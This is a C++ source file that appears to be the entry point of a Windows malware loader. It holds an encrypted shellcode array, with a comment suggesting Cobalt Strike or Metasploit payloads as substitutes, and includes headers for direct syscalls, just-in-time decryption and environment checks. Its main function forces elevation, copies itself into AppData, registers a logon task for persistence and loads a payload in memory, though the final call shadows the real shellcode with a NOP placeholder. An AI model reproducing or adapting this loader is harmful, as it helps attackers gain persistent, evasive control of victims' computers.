#include <Windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "connector.h"
#include "syscalls.h"
#include "jitdecrypt.h"
#include "apis.h"
#include "persistence.h"
#include "elevation.h"
#include "environment.h"
#include "module_loader.h"
#include <string>

// Add required libraries for linking
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// shellcode is from sektor7 rto course, but you can use cobalt strike / metasploit / whatever c2 else
unsigned char payload[] = {
    0x6b, 0xa9, 0x9d, 0x33, 0x9a, 0x61, 0x49, 0xa8, 0x6c, 0x28, 0xcd, 0x7d, 0x06, 0x6c, 0x0c, 0xec,
    0xb1, 0xee, 0x07, 0x49, 0xcd, 0x6d, 0xd5, 0x81, 0x14, 0x45, 0xdf, 0x99, 0x54, 0x06, 0x17, 0x95,
    0x6c, 0xc7, 0x0f, 0xbc, 0x1e, 0x25, 0x51, 0x60, 0x01, 0x6e, 0x63, 0xf7, 0x76, 0x13, 0x1c, 0x04,
    0x13, 0xcc, 0x36, 0xca, 0x27, 0xb0, 0x6c, 0xae, 0xf7, 0x4a, 0x3d, 0x6c, 0xdf, 0x36, 0x51, 0x5c,
    0xe0, 0xa7, 0xa7, 0x7e, 0x84, 0x64, 0xe6, 0x3c, 0x33, 0xf2, 0x07, 0x65, 0x60, 0xc1, 0x12, 0xf6,
    0xdd, 0x27, 0xbc, 0x65, 0x0b, 0x8e, 0x1c, 0x52, 0x15, 0xc4, 0xb6, 0x22, 0x85, 0xd6, 0xd5, 0x62,
    0xe6, 0x94, 0x6c, 0x06, 0x85, 0xf2, 0xb1, 0xf7, 0xae, 0x29, 0xe8, 0x93, 0x07, 0x6a, 0x47, 0xb2,
    0xa6, 0xc2, 0x1d, 0xac, 0x95, 0xf9, 0x06, 0x13, 0x1c, 0xe1, 0x84, 0x61, 0x7f, 0xd8, 0xb4, 0xc4,
    0x90, 0x43, 0xb5, 0x34, 0xed, 0x25, 0x10, 0x31, 0xdb, 0x22, 0x8f, 0xfa, 0x47, 0x4d, 0xe0, 0xe2,
    0x9e, 0x57, 0x41, 0xcf, 0x65, 0xf0, 0x34, 0x74, 0x9c, 0xdb, 0x6f, 0x7a, 0x9c, 0xe7, 0x52, 0x0f,
    0x55, 0x0f, 0x08, 0xbf, 0x05, 0x59, 0x6b, 0xb7, 0x15, 0x09, 0xcc, 0x6d, 0xee, 0x68, 0xbf, 0x1c,
    0xbd, 0x3f, 0xcf, 0xa5, 0xd7, 0x57, 0x2c, 0x95, 0x1b, 0x22, 0x73, 0xdc, 0x3a, 0xc9, 0x11, 0x4d,
    0xcd, 0xf6, 0x36, 0xcc, 0xf8, 0x01, 0xd6, 0x73, 0x2e, 0xb6, 0x54, 0xec, 0x64, 0xfa, 0x01, 0xf9,
    0x79, 0x41, 0x05, 0x52, 0x86, 0x02, 0xc9, 0x07, 0x27, 0x8d, 0x32, 0xac, 0xf5, 0x7d, 0x82, 0xe8,
    0xfb, 0x61, 0xdc, 0xc4, 0x63, 0x5b, 0x0c, 0xb5, 0x56, 0x95, 0xd7, 0xbd, 0x0d, 0x93, 0x4a, 0xdd,
    0x44, 0xa8, 0x96, 0xc3, 0x20, 0xc6, 0x51, 0x62, 0x27, 0xa4, 0x64, 0x61, 0xd5, 0x80, 0xea, 0x64,
    0x9e, 0x79, 0xba, 0x7c, 0xee, 0x79, 0x6f, 0x87, 0xe4, 0xb5, 0x24, 0x81, 0x95, 0x3a, 0x65, 0xd3,
    0xbd, 0x76, 0x40, 0xbc
};

int wmain() {
    EnsureElevated();

    std::wstring destPath;
    if (CopySelfToAppData(destPath)) {
        RegisterLogonTask(destPath);
    }

    if (CheckEnvironment() == 0) {
        // The details of the module and target process are not specified,
        // so we'll use a placeholder for now.
        HANDLE targetProcess = GetCurrentProcess();
        unsigned char payload[] = { 0x90, 0x90, 0x90, 0x90 };
        LaunchInMemoryModule(targetProcess, payload, sizeof(payload));
    }

    return 0;
}
